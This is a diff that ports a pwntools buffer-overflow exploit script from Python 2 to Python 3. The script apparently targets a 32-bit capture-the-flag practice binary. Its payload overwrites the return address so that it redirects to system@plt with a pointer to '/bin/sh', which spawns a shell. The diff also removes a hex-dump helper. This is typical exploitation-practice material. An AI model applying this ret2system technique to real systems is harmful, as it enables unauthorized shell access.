@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 import sys
 import time
 import argparse
@@ -6,14 +6,7 @@ from pwn import *
 context.update(arch='i386', os='linux')
 
 def wait_for_prompt(r):
-  print r.recvuntil("MUHAHAHAH: ")
-
-def wait_newline_and_dump(r):
-  data = r.recvuntil('\n')
-  if data:
-    print data.encode('hex')
-    print data
-  return data
+  print(r.recvuntil(b"MUHAHAHAH: "))
 
 #--------------------------------------------------------------------------
 if __name__ == "__main__":
@@ -32,7 +25,7 @@ if __name__ == "__main__":
     r = process(exe)
 
   wait_for_prompt(r)
-  payload  = 'A'*1036
+  payload  = b'A'*1036
   payload += p32(0x0804856a)  #Return pointer. Point this to 0x0804856a <+79>:    call   0x80483e0 <system@plt>
   payload += p32(0x8048664)   #This will be the pointer passed to system(), make this a pointer to '/bin/sh'
 
